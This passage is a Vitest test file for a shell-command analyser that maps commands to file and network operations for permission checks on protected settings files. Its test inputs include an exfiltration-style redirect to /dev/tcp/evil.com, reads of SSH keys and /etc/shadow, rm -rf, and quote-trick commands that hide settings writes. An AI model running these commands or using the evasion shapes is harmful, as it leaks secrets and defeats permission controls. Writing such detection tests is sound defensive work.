/**
 * @license
 * Copyright 2025 Qwen team
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect } from 'vitest';
import {
  extractShellOperations,
  extractShellOperationsAcrossCommand,
} from './shell-semantics.js';
import type { ShellOperation } from './shell-semantics.js';

const CWD = '/home/user/project';
const SETTINGS = `${CWD}/.qwen/settings.json`;
const REPO_SETTINGS = '/repo/.qwen/settings.json';

// Helper: sort ops for stable comparison
function sorted(ops: ShellOperation[]) {
  return [...ops].sort((a, b) =>
    `${a.virtualTool}:${a.filePath ?? ''}:${a.domain ?? ''}`.localeCompare(
      `${b.virtualTool}:${b.filePath ?? ''}:${b.domain ?? ''}`,
    ),
  );
}

const fileOp =
  (virtualTool: ShellOperation['virtualTool']) =>
  (filePath: string): ShellOperation => ({ virtualTool, filePath });
const read = fileOp('read_file');
const write = fileOp('write_file');
const edit = fileOp('edit');
const dir = fileOp('list_directory');
const web = (domain: string): ShellOperation => ({
  virtualTool: 'web_fetch',
  domain,
});
/** A write whose path was resolved against a cwd the analysis cannot know. */
const uncertainWrite = (
  filePath: string,
  pathMayDependOnCwd = true,
): ShellOperation => ({
  virtualTool: 'write_file',
  filePath,
  cwdUnknown: true,
  pathMayDependOnCwd,
});
const ops = (command: string) => extractShellOperations(command, CWD);
const across = (command: string) =>
  extractShellOperationsAcrossCommand(command, '/repo');
const expectSorted = (command: string, expected: ShellOperation[]) =>
  expect(sorted(ops(command))).toEqual(expected);
type Row = [title: string, command: string, expected: ShellOperation[]];

describe('extractShellOperations', () => {
  it.each<Row>([
    ['returns [] for empty string', '', []],
    ['returns [] for whitespace', '   ', []],
    ['returns [] for unknown commands', 'frobnicate /etc/passwd', []],
    ['returns [] for env-var assignments', 'FOO=bar', []],
    ['cat: absolute path', 'cat /etc/passwd', [read('/etc/passwd')]],
    [
      'cat: relative path resolved against cwd',
      'cat secrets.txt',
      [read(`${CWD}/secrets.txt`)],
    ],
    ['cat: flags are ignored', 'cat -n /etc/hosts', [read('/etc/hosts')]],
    [
      'cat: quoted path',
      "cat '/etc/my file.conf'",
      [read('/etc/my file.conf')],
    ],
    [
      'head: -n value not treated as path',
      'head -n 10 /var/log/syslog',
      [read('/var/log/syslog')],
    ],
    [
      'grep: first positional is pattern, rest are files',
      'grep password /etc/shadow',
      [read('/etc/shadow')],
    ],
    ['grep: -r becomes list_directory', 'grep -r secret /etc', [dir('/etc')]],
    // -f consumes patterns.txt and sets hasPatternFlag, so every positional
    // is a file path (no slice(1)).
    [
      'grep: -f patternfile — positionals are file paths',
      'grep -f patterns.txt /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'grep: -A value not treated as path',
      'grep -A 3 error /var/log/app.log',
      [read('/var/log/app.log')],
    ],
    ['ls: no args defaults to cwd', 'ls', [dir(CWD)]],
    ['ls: explicit dir', 'ls /var/log', [dir('/var/log')]],
    [
      'find: first positional is starting dir',
      'find /etc -name "*.conf"',
      [dir('/etc')],
    ],
    ['find: no starting dir defaults to cwd', 'find -name "*.txt"', [dir(CWD)]],
    [
      'find: extracts write ops from exec clauses',
      'find . -exec cp payload .qwen/settings.json ;',
      [dir(CWD), read(`${CWD}/payload`), write(SETTINGS)],
    ],
    [
      'touch: creates a file (write_file)',
      'touch /tmp/new.txt',
      [write('/tmp/new.txt')],
    ],
    [
      'mkdir: creates a directory (write_file)',
      'mkdir -p /tmp/a/b',
      [write('/tmp/a/b')],
    ],
    [
      'rm: single file is edit',
      'rm /tmp/secret.txt',
      [edit('/tmp/secret.txt')],
    ],
    ['rm -rf: directory is edit', 'rm -rf /tmp/dir', [edit('/tmp/dir')]],
    [
      'chmod: mode arg is skipped, file is edit',
      'chmod 755 /usr/local/bin/script',
      [edit('/usr/local/bin/script')],
    ],
    [
      'chown: owner arg is skipped, file is edit',
      'chown root:root /etc/config',
      [edit('/etc/config')],
    ],
    [
      'sed without -i: read_file',
      "sed 's/foo/bar/' /etc/hosts",
      [read('/etc/hosts')],
    ],
    ['sed -i: edit', "sed -i 's/foo/bar/' /etc/hosts", [edit('/etc/hosts')]],
    [
      'sed combined short flags containing i: edit',
      "sed -nie 's/foo/bar/' /etc/hosts",
      [edit('/etc/hosts')],
    ],
    [
      'awk: program expression filtered, file identified',
      "awk '{print $1}' /etc/passwd",
      [read('/etc/passwd')],
    ],
    [
      'awk -F: separator consumed, file identified',
      "awk -F: '{print $2}' /etc/shadow",
      [read('/etc/shadow')],
    ],
    [
      'awk -i inplace: edits files in place',
      'awk -i inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'awk --include=inplace: edits files in place',
      'awk --include=inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'gawk -i inplace: edits files in place',
      'gawk -i inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'redirect >: write_file',
      'echo hello > /tmp/out.txt',
      [write('/tmp/out.txt')],
    ],
    [
      'redirect >>: write_file',
      'date >> /var/log/app.log',
      [write('/var/log/app.log')],
    ],
    [
      'curl: extracts domain',
      'curl https://api.example.com/data',
      [web('api.example.com')],
    ],
    [
      'wget: extracts domain',
      'wget https://example.com/file.tar.gz',
      [web('example.com')],
    ],
    [
      'sudo cat: transparent wrapper',
      'sudo cat /etc/sudoers',
      [read('/etc/sudoers')],
    ],
    [
      'sudo -u user cat: strips flags before inner cmd',
      'sudo -u root cat /etc/shadow',
      [read('/etc/shadow')],
    ],
    [
      'env cmd: transparent wrapper',
      'env cat /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'timeout cmd: transparent wrapper',
      'timeout 30 wget https://example.com',
      [web('example.com')],
    ],
    // $SECRET_FILE starts with $, filtered by looksLikePath
    ['$VAR paths are not included', 'cat $SECRET_FILE', []],
  ])('%s', (_title, command, expected) => {
    expect(ops(command)).toEqual(expected);
  });

  const curlOut = [web('api.example.com'), write('/tmp/out.json')];
  const wgetOut = [web('example.com'), write('/tmp/file.gz')];
  it.each<Row>([
    ['cat: multiple files', 'cat /a/b /c/d', [read('/a/b'), read('/c/d')]],
    [
      'tail: multiple files with flag',
      'tail -c 100 /a /b',
      [read('/a'), read('/b')],
    ],
    ['diff: two files', 'diff /old /new', [read('/new'), read('/old')]],
    [
      'grep: -e flag shifts all positionals to paths',
      'grep -e password /etc/passwd /etc/shadow',
      [read('/etc/passwd'), read('/etc/shadow')],
    ],
    [
      'cp: src=read, dst=write',
      'cp /etc/passwd /tmp/backup',
      [read('/etc/passwd'), write('/tmp/backup')],
    ],
    [
      'mv: src=edit, dst=write',
      'mv /tmp/a /tmp/b',
      [edit('/tmp/a'), write('/tmp/b')],
    ],
    [
      'sed -e: all positionals are files',
      "sed -e 's/foo/bar/' /a /b",
      [read('/a'), read('/b')],
    ],
    [
      'dd if= and of=',
      'dd if=/dev/sda of=/tmp/disk.img',
      [read('/dev/sda'), write('/tmp/disk.img')],
    ],
    [
      'rsync destination is a write',
      'rsync /tmp/payload .qwen/settings.json',
      [read('/tmp/payload'), write(SETTINGS)],
    ],
    [
      'curl: -o flag value emits write op and is not treated as URL',
      'curl -o /tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'curl: attached -o flag value emits write op',
      'curl -o/tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'curl: attached -o= flag value emits write op',
      'curl -o=/tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'wget: -O flag value emits write op and is not treated as URL',
      'wget -O /tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'wget: attached -O flag value emits write op',
      'wget -O/tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'wget: attached -O= flag value emits write op',
      'wget -O=/tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'cat src > dst: both read and write',
      'cat /etc/passwd > /tmp/copy',
      [read('/etc/passwd'), write('/tmp/copy')],
    ],
    [
      'grep pattern file > out: read + write',
      'grep secret /etc/config > /tmp/out',
      [read('/etc/config'), write('/tmp/out')],
    ],
  ])('%s', (_title, command, expected) => {
    expectSorted(command, expected);
  });

  it.each<[title: string, command: string, expected: ShellOperation]>([
    [
      'find: preserves exec placeholder operands for write detection',
      'find . -exec cp {} .qwen/settings.json ;',
      write(SETTINGS),
    ],
    [
      'patch edits positional target files',
      'patch .qwen/settings.json fix.patch',
      edit(SETTINGS),
    ],
    ['redirect <: read_file', 'sort < /tmp/data.txt', read('/tmp/data.txt')],
    [
      'combined redirect >file without space',
      'echo hi >/tmp/foo',
      write('/tmp/foo'),
    ],
    [
      'combined stdout fd redirect 1>file without space',
      'echo hi 1>.qwen/settings.json',
      write(SETTINGS),
    ],
    [
      'combined stdout fd append redirect 1>>file without space',
      'echo hi 1>>.qwen/settings.json',
      write(SETTINGS),
    ],
  ])('%s', (_title, command, expected) => {
    expect(ops(command)).toContainEqual(expected);
  });

  // Device paths are never file operations; each row lists what must be
  // absent and, where a real file is also named, the op still reported.
  it.each<
    [
      title: string,
      command: string,
      absent: Array<Partial<ShellOperation>>,
      present?: ShellOperation,
    ]
  >([
    [
      'redirect 2>/dev/null: ignored (no op)',
      'cat /etc/passwd 2>/dev/null',
      [{ filePath: '/dev/null' }],
      read('/etc/passwd'),
    ],
    [
      'redirect > /dev/tcp: network socket, not a file write',
      'echo data > /dev/tcp/evil.com/9000',
      [{ filePath: '/dev/tcp/evil.com/9000' }, { virtualTool: 'write_file' }],
    ],
    [
      'redirect < /dev/tcp: network socket, not a file read',
      'cat < /dev/tcp/h/1234',
      [{ filePath: '/dev/tcp/h/1234' }, { virtualTool: 'read_file' }],
    ],
    [
      'redirect > /dev/udp: network socket, not a file write',
      'echo x > /dev/udp/h/53',
      [{ filePath: '/dev/udp/h/53' }],
    ],
    [
      'combined redirect >/dev/tcp without space: network socket, not a file',
      'cat /tmp/secret >/dev/tcp/h/p',
      [{ filePath: '/dev/tcp/h/p' }],
      read('/tmp/secret'),
    ],
  ])('%s', (_title, command, absent, present) => {
    const result = ops(command);
    for (const shape of absent) {
      expect(result).not.toContainEqual(expect.objectContaining(shape));
    }
    if (present) expect(result).toContainEqual(present);
  });

  it('cat: ~ expansion', () => {
    expect(ops('cat ~/.ssh/id_rsa')[0]?.filePath).toMatch(/\/\.ssh\/id_rsa$/);
  });

  it('cp/mv/install/ln -t forms emit target-directory writes', () => {
    expectSorted('cp -t .qwen /tmp/settings.json', [
      read('/tmp/settings.json'),
      write(SETTINGS),
    ]);
    expectSorted('mv --target-directory=.qwen /tmp/a', [
      edit('/tmp/a'),
      write(`${CWD}/.qwen/a`),
    ]);
    expectSorted('install -t .qwen /tmp/tool', [
      read('/tmp/tool'),
      write(`${CWD}/.qwen/tool`),
    ]);
    expectSorted('ln -t .qwen /tmp/target', [
      read('/tmp/target'),
      write(`${CWD}/.qwen/target`),
    ]);
    expectSorted('cp -rt .qwen /tmp/payload', [
      read('/tmp/payload'),
      write(`${CWD}/.qwen/payload`),
    ]);
  });

  it('perl -i edits file operands', () => {
    expect(ops("perl -i -pe 's/x/y/' .qwen/settings.json")).toEqual([
      edit(SETTINGS),
    ]);
    expect(ops("perl -i -e 's/x/y/' .qwen/settings.json")).toEqual([
      edit(SETTINGS),
    ]);
  });

  it('patch edits output flag targets', () => {
    for (const command of [
      'patch --output=.qwen/settings.json -i fix.patch',
      'patch -o .qwen/settings.json -i fix.patch',
    ]) {
      expect(ops(command)).toContainEqual(edit(SETTINGS));
    }
  });

  it('sort -o emits the output path as a write', () => {
    expectSorted('sort -o .qwen/settings.json /tmp/in', [
      read('/tmp/in'),
      write(SETTINGS),
    ]);
    expectSorted('sort --output=.qwen/settings.json /tmp/in', [
      read('/tmp/in'),
      write(SETTINGS),
    ]);
  });

  it('regression: ordinary file redirects still tracked', () => {
    expect(ops('echo hi > out.txt')).toContainEqual(write(`${CWD}/out.txt`));
    expect(ops('sort < in.txt')).toContainEqual(read(`${CWD}/in.txt`));
  });
});

// Shared compound shell analysis for permission rules and AUTO review.
describe('extractShellOperationsAcrossCommand', () => {
  it.each<Row>([
    [
      'tracks literal `cd` across compound segments before resolving writes',
      "cd .qwen && bash -lc 'echo {} > settings.json'",
      [write(REPO_SETTINGS)],
    ],
    [
      'handles leading env assignments before redirected commands',
      'FOO=bar echo x > .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'handles leading env assignments before write commands',
      'FOO=bar tee .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'tracks cwd before leading env assignments',
      "cd .qwen && FOO=bar echo '{}' > settings.json",
      [write(REPO_SETTINGS)],
    ],
    // The foreground form below cannot know where it landed; the backgrounded
    // one can, because it did not move the cwd at all.
    [
      'does not mark later paths uncertain for a backgrounded dynamic `cd`',
      'cd "$TARGET" & echo {} > settings.json',
      [write('/repo/settings.json')],
    ],
    // Over-correction guards: only the backgrounded `cd` is exempt. Both of
    // these pass before and after the change.
    [
      'keeps a foreground `cd` moving the cwd',
      'cd /tmp && echo {} > settings.json',
      [write('/tmp/settings.json')],
    ],
    [
      'keeps a foreground dynamic `cd` marking later paths uncertain',
      'cd "$TARGET" && echo {} > settings.json',
      [uncertainWrite('/repo/settings.json')],
    ],
    [
      'applies a foreground `cd` that follows a backgrounded one',
      'cd /tmp & cd /var && echo {} > settings.json',
      [write('/var/settings.json')],
    ],
    // The actual write is nested two wrapper levels deep.
    [
      'recursively unwraps nested shell wrappers',
      'bash -lc "sh -c \'echo hi > .mcp.json\'"',
      [write('/repo/.mcp.json')],
    ],
    [
      'preserves sibling segments after a shell wrapper',
      "bash -lc 'echo ok' && echo hi > .qwen/settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'splits literal newlines as command boundaries',
      'cd .qwen\ncp /tmp/malicious settings.json',
      [read('/tmp/malicious'), write(REPO_SETTINGS)],
    ],
    [
      'tracks cwd through brace-grouped commands',
      "{ cd .qwen && echo '{}' > settings.json; }",
      [write(REPO_SETTINGS)],
    ],
    [
      'strips grouping and background syntax from command and path tokens',
      '(echo > .qwen/settings.json) && echo > .qwen/hooks/run.sh&',
      [write(REPO_SETTINGS), write('/repo/.qwen/hooks/run.sh')],
    ],
    [
      'does not treat heredoc body lines as executable shell segments',
      [
        'cd .qwen',
        "cat <<'EOF'",
        'cd /tmp',
        'EOF',
        'echo > settings.json',
      ].join('\n'),
      [write(REPO_SETTINGS)],
    ],
    [
      'does not treat quoted heredoc-looking text as a heredoc marker',
      ["echo '<<EOF'", 'cd .qwen', "echo '{}' > settings.json"].join('\n'),
      [write(REPO_SETTINGS)],
    ],
    [
      'handles `cd --` and other POSIX flag forms before the target',
      "cd -- .qwen && printf '{}' > settings.local.json",
      [write('/repo/.qwen/settings.local.json')],
    ],
    [
      'treats the word after `cd --` as the target even when it starts with dash',
      "cd -- -some-dir && printf '{}' > settings.local.json",
      [write('/repo/-some-dir/settings.local.json')],
    ],
    [
      'ignores redirects attached to cd when resolving static cwd',
      "cd .qwen >/dev/null && echo '{}' > settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'tracks static pushd targets like cd targets',
      "pushd .qwen && printf '{}' > settings.local.json",
      [write('/repo/.qwen/settings.local.json')],
    ],
    [
      'marks writes after popd as cwd-unknown',
      "popd && printf '{}' > settings.local.json",
      [uncertainWrite('/repo/settings.local.json')],
    ],
    [
      'marks writes after popd with expansion args as cwd-unknown',
      "popd $DIR && printf '{}' > settings.local.json",
      [uncertainWrite('/repo/settings.local.json')],
    ],
    // Keep the guessed path, but mark it unsafe to trust as final.
    [
      'marks relative writes after dynamic `cd` targets as cwd-unknown',
      'cd $TARGET && echo hi > out.txt',
      [uncertainWrite('/repo/out.txt')],
    ],
    [
      'marks all file ops after dynamic `cd` as cwd-unknown',
      'cd "$QWEN_HOME" && echo hi > ../settings.json',
      [uncertainWrite('/settings.json')],
    ],
    [
      'clears cwd-unknown after an absolute static `cd`',
      'cd $TARGET && cd /repo/.qwen && echo hi > settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'preserves operation order across compound segments',
      'echo a > one.txt && cd sub && echo b > two.txt; cat /etc/hosts',
      [write('/repo/one.txt'), write('/repo/sub/two.txt'), read('/etc/hosts')],
    ],
    [
      'returns no ops when only `cd` segments are present',
      'cd .qwen && cd ..',
      [],
    ],
  ])('%s', (_title, command, expected) => {
    expect(across(command)).toEqual(expected);
  });

  // A backgrounded `cd` runs in a subshell, so the parent's cwd is untouched
  // and the next segment's relative write lands in the *original* directory —
  // which is exactly where a protected settings file lives. Attributing the
  // write to the `cd` target instead would check the wrong path.
  it.each([
    ['cd /tmp & echo {} > settings.json'],
    ['cd .qwen & echo {} > settings.json'],
  ])('does not move the cwd for the backgrounded `cd` in %s', (command) => {
    expect(across(command)).toEqual([write('/repo/settings.json')]);
  });

  it('attributes the write to the real cwd when quoting hides the async operator (#12246)', () => {
    // The `;` between the two quote fragments only exists under the
    // escape-everywhere reading; bash reads `\'...'` as literal backslash
    // plus a re-opened quote, so the second `cd` runs in a background
    // subshell and the write lands in the first cd's target.
    expect(
      across(`cd .qwen ; cd 'x\\'';echo ' & echo {} > settings.json`),
    ).toEqual([write(REPO_SETTINGS)]);
  });

  // Quoted shell metacharacters are legal in real directory names
  // (`mkdir 'foo;bar'` is valid POSIX). tokenize strips the quotes before the
  // cd target is classified, so the metacharacter escalation must only fire
  // for a segment only one quote reading produces; when both readings segment
  // the command identically a quoted `;`/`&` is a name, not a split artifact.
  it.each([
    ["cd 'foo;bar' && echo {} > settings.json", '/repo/foo;bar/settings.json'],
    ["cd 'a&b' && echo {} > settings.json", '/repo/a&b/settings.json'],
    ['cd "foo;bar" && echo {} > settings.json', '/repo/foo;bar/settings.json'],
    // An unrelated backslash elsewhere in the command must not de-resolve a
    // genuinely quoted metacharacter directory.
    [
      "cd 'foo;bar' && echo {} > settings.json && printf 'a\\n'",
      '/repo/foo;bar/settings.json',
    ],
    // A quoted name holding both a backslash and a metacharacter is real
    // syntax both readings segment identically, not an artifact (#R7-1).
    [
      "cd 'D:\\R&D\\build' && npm test > results.txt",
      'D:/R&D/build/results.txt',
    ],
    [
      "cd 'C:\\Users\\me\\R&D' && echo {} > settings.json",
      'C:/Users/me/R&D/settings.json',
    ],
    [
      "cd 'R&D\\shared' && echo {} > settings.json",
      '/repo/R&D/shared/settings.json',
    ],
    ["cd 'r&d\\x' && printf p > .env", '/repo/r&d/x/.env'],
    // The closing quote right after a backslash does not make the directory a
    // quoting artifact either; bash really enters it (#R7-1).
    [
      "cd 'C:\\Users\\me\\R&D\\' && echo {} > settings.json",
      'C:/Users/me/R&D/settings.json',
    ],
  ])(
    'resolves the quoted metacharacter directory in %s without escalating',
    (command, expectedPath) => {
      expect(across(command)).toEqual([write(expectedPath)]);
    },
  );

  it.each(['pushd', 'pushd +2', 'pushd -2', 'pushd -n /tmp'])(
    'marks writes after `%s` as cwd-unknown',
    (command) => {
      expect(across(`${command} && printf '{}' > settings.local.json`)).toEqual(
        [uncertainWrite('/repo/settings.local.json')],
      );
    },
  );

  it('does not mark absolute writes after dynamic `cd` as cwd-dependent', () => {
    for (const command of [
      'cd "$QWEN_HOME" && echo hi > /tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi 1>/tmp/out.txt',
    ]) {
      expect(across(command)).toEqual([uncertainWrite('/tmp/out.txt', false)]);
    }
  });

  it('falls back gracefully on excessively deep wrapper nesting', () => {
    // A pathological chain hits MAX_SHELL_UNWRAP_DEPTH (4) and the remainder
    // is analysed as-is instead of recursing forever. The result does not
    // matter, only that the call returns without throwing or hanging.
    const deep = 'bash -lc "bash -lc \\"bash -lc \'bash -lc echo > x.txt\'\\""';
    expect(() => across(deep)).not.toThrow();
  });
});

describe('dual quote readings for backslash payloads (#12246 review)', () => {
  it("pins the ANSI-C escape regime: $'…' spans process escapes (#12246-R1-2)", () => {
    // bash reads $'a\' ; rm -rf src/keepme' as ONE printf argument (the \'
    // is an escaped quote in ANSI-C); the bash-accurate reading must not
    // split at that `;`. Neither reading may publish the phantom rm op.
    expect(across(`printf $'a\\' ; rm -rf src/keepme'`)).toEqual([]);
  });

  it('escalates quoting-artifact cd targets to cwdUnknown instead of a phantom cwd (#12246-R1-3)', () => {
    // The bash reading re-segments correctly but the cd target `x\;cd /etc`
    // is a quoting artifact no real directory has; it must not become a
    // concrete cwd writes are attributed to.
    const ops = across(`cd 'x\\'';cd /etc' ; echo hi > .qwen/settings.json`);
    expect(ops).toHaveLength(1);
    expect(ops[0]).toMatchObject({
      virtualTool: 'write_file',
      filePath: REPO_SETTINGS,
      cwdUnknown: true,
      pathMayDependOnCwd: true,
    });
  });

  it('threads the reading through a bash -lc wrapper (#12246-R1-5)', () => {
    const unwrapped = across(
      `cd .qwen ; cd 'x\\'';echo ' & echo {} > settings.json`,
    );
    const wrapped = across(
      `bash -lc "cd .qwen ; cd 'x\\'';echo ' & echo {} > settings.json'"`,
    );
    // The unwrapped scan ends balanced, so its write keeps the trusted
    // attribution; the wrapped inner payload ends in an open quote, which
    // routes it through the merge branch where the collision now unions the
    // escalation flags instead of dropping them (#12280 R2-3).
    expect(unwrapped).toEqual([write(REPO_SETTINGS)]);
    expect(wrapped).toEqual([uncertainWrite(REPO_SETTINGS)]);
  });

  it.each([
    [`echo 'a\\' # trailing && touch /tmp/x`],
    [`echo 'a\\' # trailing | touch /tmp/x`],
  ])(
    'pins the union op set for the comment-shape row %s (#12246-R1-6)',
    (cmd) => {
      // bash runs only the echo (the `#` opens a comment); neither quote
      // reading models comments, so the bash reading splits at the `&&`/`|`
      // and emits a phantom touch op. The phantom is pre-existing (the union
      // walk at the merge base produced the same op), and comment modeling
      // belongs to the #11882 umbrella.
      expect(across(cmd)).toEqual([write('/tmp/x')]);
    },
  );

  it('keeps a hard deny for a command that is unbalanced under the bash reading (#12246-R1-11)', () => {
    // bash rejects `cd '.qwen\'; echo x > settings.json'` with an
    // unterminated quote — nothing executes. The bash reading splits at the
    // `;` and reports the write (the escape-everywhere reading keeps one
    // quoted segment and reports nothing), so the conservative deny stands
    // exactly as it did before the dual reading.
    expect(across(`cd '.qwen\\'; echo x > settings.json'`)).toEqual([
      write(REPO_SETTINGS),
    ]);
  });

  it('pins an escape-everywhere-only write the bash reading quotes away (#R3-2)', () => {
    // bash keeps the second line inside the quote opened at the end of the
    // first, so the bash reading emits nothing; only the escape-everywhere
    // reading splits at the newline and sees the write. Dropping that walk
    // turns this red.
    const ops = across(
      "echo done # note 'a\\''\necho {} > .qwen/settings.json",
    );
    expect(ops).toEqual([write(REPO_SETTINGS)]);
  });

  it('ignores a backslash that only exists inside a heredoc body', () => {
    // The walks split stripHeredocBodies(command), so a heredoc-only
    // backslash never reaches a splitter; both readings see the same
    // `cat > f <<EOF` and the gate must not change the result.
    expect(across('cat > f <<EOF\necho a\\b\nEOF')).toEqual([write('/repo/f')]);
  });

  it('does not trust the first operand of a multi-operand cd (#R7-2)', () => {
    // bash rejects `cd /evil 'a\'' ; cd /repo '` with `too many arguments`,
    // so the cwd never moves; the write must stay attributed to the pre-cd
    // cwd with the cwd-unknown flags, not published as a phantom /evil path
    // a deny rule could cite.
    expect(
      across(`cd /evil 'a\\'' ; cd /repo ' ; echo {} > .qwen/settings.json`),
    ).toEqual([uncertainWrite(REPO_SETTINGS)]);
    expect(
      across(`cd .qwen 'a\\'' ; cd src ' ; echo {} > settings.json`),
    ).toEqual([uncertainWrite('/repo/settings.json')]);
  });

  it('drops a coarser escape-everywhere walk whose quoted span swallows real operators (#R7-3)', () => {
    // The escape-everywhere reading keeps `; cd .qwen ; echo {} >
    // settings.json` inside what it treats as an unterminated quote, then
    // mines the redirect out of that quoted text against the stale cwd.
    // bash sees four segments here, so only the bash walk survives the merge.
    expect(
      across(`cd sub ; echo 'a\\' ; cd .qwen ; echo {} > settings.json`),
    ).toEqual([write('/repo/sub/.qwen/settings.json')]);
  });
});

describe('R8 review round: operand counting, directional artifacts, bash-authoritative merge', () => {
  // Comment words, redirect residue and process-substitution fragments are
  // not `cd` operands: bash still performs the cd in every one of these, so
  // the write must resolve against the cd target with no cwd-unknown flags
  // (#12280 R7-2).
  it.each([
    ['cd .qwen # note\necho {} > settings.json', REPO_SETTINGS],
    ['cd .qwen > "$LOG" ; echo {} > settings.json', REPO_SETTINGS],
    [
      'cd sub >& 2 ; cd .qwen ; echo {} > settings.json',
      '/repo/sub/.qwen/settings.json',
    ],
    [
      'cd sub > >(tee log) ; cd .qwen ; echo {} > settings.json',
      '/repo/sub/.qwen/settings.json',
    ],
    [
      'cd sub <> l ; cd .qwen ; echo {} > settings.json',
      '/repo/sub/.qwen/settings.json',
    ],
    [
      'cd sub 4>log ; cd .qwen ; echo {} > settings.json',
      '/repo/sub/.qwen/settings.json',
    ],
    ['cd .qwen {fd}>log ; echo {} > settings.json', REPO_SETTINGS],
    // bash drops a `\<newline>` continuation outright, so a `#` opening the
    // continuation line still starts a comment; emitting the pair as an
    // escaped newline would keep the comment words as extra operands (#12280
    // R1-4).
    ['cd .qwen \\\n# note\necho {} > settings.json', REPO_SETTINGS],
    ['cd .qwen \\\n  # note\necho {} > settings.json', REPO_SETTINGS],
  ])(
    'counts only real cd operands in `%s` (#R7-2)',
    (command, expectedPath) => {
      expect(across(command)).toEqual([write(expectedPath)]);
    },
  );

  // An unrelated quote divergence elsewhere in the command must not mark a
  // genuine backslash-bearing directory as a split artifact (#12280 R7-1).
  it('resolves a genuine directory despite an unrelated divergence (#R7-1)', () => {
    expect(
      across(`printf 'a\\' ; cd 'x>y\\z' && echo {} > settings.json`),
    ).toEqual([write('/repo/x>y/z/settings.json')]);
  });

  // When the two readings tie, the bash walk sees nothing (its last segment
  // is one quoted blob) and the escape walk is the only one that surfaces the
  // write bash really performs (#12280 R7-3 tie).
  it('recovers the write a comment-sabotaged bash reading quotes away (#R7-3 tie)', () => {
    expect(
      across(`cd .qwen ; echo # note 'a\\' ; echo '\necho {} > settings.json`),
    ).toEqual([write(REPO_SETTINGS)]);
  });

  // When the readings cross, the escape walk's inverted quote parity hides
  // the `cd sub` and mines a phantom against the stale cwd; the bash walk is
  // authoritative, so only the real path is published (#12280 R7-3 crossing).
  it('does not publish the phantom a crossing escape reading mines (#R7-3 crossing)', () => {
    expect(
      across(
        `echo 'a\\' 'x;y' 'p;q' 'r;s' ; cd sub ; echo 'b\\' ; cd .qwen ; echo {} > settings.json`,
      ),
    ).toEqual([write('/repo/sub/.qwen/settings.json')]);
  });

  // The `#` comment's quote opens an unterminated quoted blob under bash's
  // reading, so the bash walk only surfaces one.txt; the escape reading
  // closes the quote differently and still sees the settings write, which
  // must be merged in rather than dropped with the early return (#12280 R7-3
  // open-quote).
  it('merges the write a comment-opened quote hides from the bash reading (#R7-3 open-quote)', () => {
    expect(
      across(
        `cd .qwen ; echo real > one.txt # note 'a\\''\necho {} > settings.json`,
      ),
    ).toEqual([write('/repo/.qwen/one.txt'), write(REPO_SETTINGS)]);
    expect(
      across(
        `echo real > one.txt ; cd .qwen ; echo done # note 'a\\''\necho {} > settings.json`,
      ),
    ).toEqual([write('/repo/one.txt'), write(REPO_SETTINGS)]);
  });

  // The bash walk finds no operation here (its last segment is one quoted
  // blob), so the fallback runs. It must keep the boundaries bash's reading
  // already found: re-walking under the escape-everywhere reading alone
  // loses the `cd sub` and attributes the write to the pre-cd directory, and
  // for a dynamic cd it drops the cwd-unknown flags (#12280 R9-2).
  it('fallback keeps the bash-found boundaries and the cwd they establish (#R9-2)', () => {
    expect(
      across(`echo 'a\\' ; cd sub ; echo # note '\necho {} > settings.json`),
    ).toEqual([write('/repo/sub/settings.json')]);
    expect(
      across(`echo 'a\\' ; cd $D ; echo # note '\necho {} > settings.json`),
    ).toEqual([uncertainWrite('/repo/settings.json')]);
  });

  // The reading decision re-runs on the unwrapped payload, so wrapping the
  // #R3-2 shape in a login shell cannot hide the write (#12280 R8-1).
  it('re-runs the reading decision inside a shell wrapper (#R8-1)', () => {
    const unwrapped = across(
      `echo done # note 'a\\''\necho {} > .qwen/settings.json`,
    );
    const wrapped = across(
      `bash -lc "echo done # note 'a\\''\necho {} > .qwen/settings.json"`,
    );
    expect(wrapped).toEqual([write(REPO_SETTINGS)]);
    expect(wrapped).toEqual(unwrapped);
  });

  // When the outer command already produces an operation, no outer-level
  // fallback runs, so the wrapper payload is the only place the write can
  // surface; threading the outer reading into the recursion loses it.
  it('re-decides the wrapped payload when outer segments also write (#R8-1)', () => {
    expect(
      across(
        `echo real > one.txt && bash -lc "echo done # note 'a\\''\necho {} > .qwen/settings.json"`,
      ),
    ).toEqual([write('/repo/one.txt'), write(REPO_SETTINGS)]);
  });
});

describe('R1 review round: comment desync, union-merge cwd, artifact spans', () => {
  // The `#` comment's apostrophe re-closes the quote the bash scan is stuck
  // in, so the scan ends balanced while the settings write sits inside what
  // bash's reading treats as a quoted blob. A comment anywhere the scanners
  // do not model forces the merge walk too; gating on the open quote alone
  // drops the write and the deny rule never sees it (#12280 R1-1).
  it('merges the write a comment apostrophe balances away from the bash scan (#12280-R1-1)', () => {
    expect(
      across(
        `cd .qwen ; echo 'a\\' ; echo x > one.txt ; echo done # note '\necho {} > settings.json # trailing '`,
      ),
    ).toEqual([write('/repo/.qwen/one.txt'), write(REPO_SETTINGS)]);
  });

  // The merge walk triggered by the open quote must use the union split:
  // re-walking under the escape-everywhere reading alone from the original
  // cwd loses the `cd sub` and publishes a phantom /repo/f next to the real
  // /repo/sub/f (#12280 R1-5).
  it('merge walk keeps the bash-found cd boundaries (#12280-R1-5)', () => {
    expect(
      across(`echo y > g ; echo 'a\\' ; cd sub ; echo x > f # note '`),
    ).toEqual([write('/repo/g'), write('/repo/sub/f')]);
  });

